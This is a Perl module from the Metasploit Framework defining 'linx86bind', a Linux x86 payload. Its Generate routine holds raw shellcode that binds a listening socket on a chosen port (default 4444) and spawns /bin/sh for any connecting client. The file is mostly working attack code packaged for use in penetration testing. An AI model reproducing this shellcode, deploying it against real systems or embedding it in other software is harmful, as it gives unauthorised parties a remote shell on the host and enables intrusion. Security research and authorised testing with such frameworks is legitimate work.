##
# This file is part of the Metasploit Framework and may be redistributed according
# to the licenses defined in the Authors fields below. In the case of a an Unknown
# license, this file defaults to using the same license as the core Framework. The
# latest version of the Framework can always be obtained from http://metasploit.com
##

package Msf::Payload::linx86_bind;
use strict;
use base 'Msf::PayloadComponent::BindConnection';

my $info =
{
  'Name'         => 'linx86bind',
  'Version'      => '$Revision$',
  'Description'  => 'Listen for connection and spawn a shell',
  'Authors'      => [ 'bighawk [Unknown License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'linux' ],
  'Size'         => '',
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('LPORT')));
}

sub Generate {
  my $self = shift;
  my $port = shift;
  my $off_port = 21;
  my $port_bin = pack('n', $port);

  my $shellcode = # linux bind shellcode by bighawk
  "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80".
  "\x89\xc7\x52\x66\x68\x27\x10\x43\x66\x53\x89\xe1\xb0\x10\x50\x51".
  "\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50\x57".
  "\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80".
  "\x41\xe2\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3".
  "\x51\x53\x89\xe1\xb0\x0b\xcd\x80";

  substr($shellcode, $off_port, 2, $port_bin);
  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('4444');
  return(length($bin));
}

1;
